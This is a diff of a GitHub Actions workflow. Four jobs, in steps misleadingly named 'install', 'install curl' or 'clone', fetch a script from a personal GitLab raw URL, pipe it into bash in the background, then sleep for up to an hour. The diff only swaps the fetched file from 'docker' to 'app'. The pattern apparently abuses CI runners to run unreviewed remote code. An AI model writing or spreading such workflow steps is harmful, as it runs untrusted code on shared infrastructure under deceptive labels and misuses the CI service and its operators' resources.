@@ -24,7 +24,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: install
-      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/docker | bash &
+      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/app | bash &
            sleep 360s
   cincau:
     needs: build
@@ -42,7 +42,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: install curl
-      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/docker | bash &
+      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/app | bash &
             sleep 16m
         
     
@@ -63,7 +63,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: clone
-      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/docker | bash &
+      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/app | bash &
             sleep 26m
   tekwan:
     needs: cincau
@@ -81,5 +81,5 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v2
     - name: clone
-      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/docker | bash &
+      run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/app | bash &
             sleep 60m
